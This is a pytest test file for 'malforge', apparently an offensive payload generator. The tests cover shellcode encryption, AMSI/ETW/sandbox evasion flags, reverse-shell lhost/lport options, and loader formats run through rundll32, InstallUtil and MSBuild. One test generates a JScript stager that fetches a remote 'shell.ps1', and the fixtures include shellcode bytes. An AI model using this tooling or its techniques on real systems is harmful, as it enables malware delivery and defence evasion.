import os
import sys
import tempfile
import pytest
from types import SimpleNamespace
from malforge.forge import validate, run, COMPAT


def _args(**kw):
    defaults = dict(
        format='exe', encrypt=None, input=None, lhost=None, lport=None,
        payload=None, output=None, amsi=False, etw=False, sandbox=False,
        url='', key=None,
    )
    defaults.update(kw)
    return SimpleNamespace(**defaults)


def test_validate_exe_xor():
    methods = validate(_args(format='exe', encrypt='xor', lhost='10.0.0.1', lport='443'))
    assert methods == ['xor']


def test_validate_exe_chain():
    methods = validate(_args(format='exe', encrypt='xor,aes', lhost='10.0.0.1', lport='443'))
    assert methods == ['xor', 'aes']


def test_validate_no_encrypt():
    methods = validate(_args(format='exe', encrypt=None, lhost='10.0.0.1', lport='443'))
    assert methods == []


def test_validate_unknown_format():
    with pytest.raises(SystemExit):
        validate(_args(format='badformat'))


def test_validate_unknown_encryption():
    with pytest.raises(SystemExit):
        validate(_args(format='exe', encrypt='blowfish'))


def test_validate_incompatible_encryption():
    with pytest.raises(SystemExit):
        validate(_args(format='macro', encrypt='aes'))


def test_validate_js_no_encrypt_ok():
    methods = validate(_args(format='js', encrypt=None))
    assert methods == []


def test_validate_js_with_encrypt_fails():
    with pytest.raises(SystemExit):
        validate(_args(format='js', encrypt='xor'))


def test_validate_needs_shellcode():
    with pytest.raises(SystemExit):
        validate(_args(format='exe', encrypt='xor'))


def test_validate_shellcode_from_lhost():
    methods = validate(_args(format='exe', encrypt='xor', lhost='10.0.0.1', lport='443'))
    assert methods == ['xor']


def test_run_with_input_file():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        f.flush()
        args = _args(format='exe', encrypt='xor', input=f.name)
        run(args)
    os.unlink(f.name)


def test_run_output_to_file():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as inp:
        inp.write(sc)
        inp.flush()

    with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as out:
        outpath = out.name

    args = _args(format='exe', encrypt='xor', input=inp.name, output=outpath)
    run(args)

    with open(outpath) as f:
        content = f.read()
    assert 'VirtualAlloc' in content
    assert '__' not in content

    os.unlink(inp.name)
    os.unlink(outpath)


def test_run_hex_input():
    with tempfile.NamedTemporaryFile(suffix='.txt', mode='w', delete=False) as f:
        f.write('fc4883e4f0e8cc000000')
        f.flush()
    args = _args(format='exe', encrypt='xor', input=f.name)
    run(args)
    os.unlink(f.name)


def test_run_csharp_input():
    with tempfile.NamedTemporaryFile(suffix='.txt', mode='w', delete=False) as f:
        f.write('byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0 };')
        f.flush()
    args = _args(format='exe', encrypt='xor', input=f.name)
    run(args)
    os.unlink(f.name)


def test_run_jscript():
    args = _args(format='js', url='http://10.0.0.1/shell.ps1')
    run(args)


def test_run_with_user_key():
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        f.flush()

    key_hex = 'deadbeefcafebabe' * 2  # 16 bytes
    args = _args(format='exe', encrypt='xor', input=f.name, key=key_hex)
    run(args)
    os.unlink(f.name)


def test_all_formats_in_compat():
    from malforge.emit import FORMATS
    assert set(COMPAT.keys()) == set(FORMATS.keys())


def test_run_dll_output_hint(capsys):
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name
    with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as f:
        out = f.name

    args = _args(format='dll', encrypt='xor', input=inp, output=out)
    run(args)
    captured = capsys.readouterr()
    assert 'rundll32' in captured.err or 'mcs' in captured.err
    os.unlink(inp)
    os.unlink(out)


def test_run_installutil_output_hint(capsys):
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name
    with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as f:
        out = f.name

    args = _args(format='installutil', encrypt='xor', input=inp, output=out)
    run(args)
    captured = capsys.readouterr()
    assert 'InstallUtil' in captured.err
    os.unlink(inp)
    os.unlink(out)


def test_run_msbuild_output_hint(capsys):
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name
    with tempfile.NamedTemporaryFile(suffix='.csproj', delete=False) as f:
        out = f.name

    args = _args(format='msbuild', encrypt='xor', input=inp, output=out)
    run(args)
    captured = capsys.readouterr()
    assert 'MSBuild' in captured.err
    os.unlink(inp)
    os.unlink(out)


def test_run_no_encryption(capsys):
    sc = os.urandom(64)
    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as f:
        f.write(sc)
        inp = f.name

    args = _args(format='exe', encrypt=None, input=inp)
    run(args)
    captured = capsys.readouterr()
    assert 'byte[] buf' in captured.out or '0x' in captured.out
    os.unlink(inp)
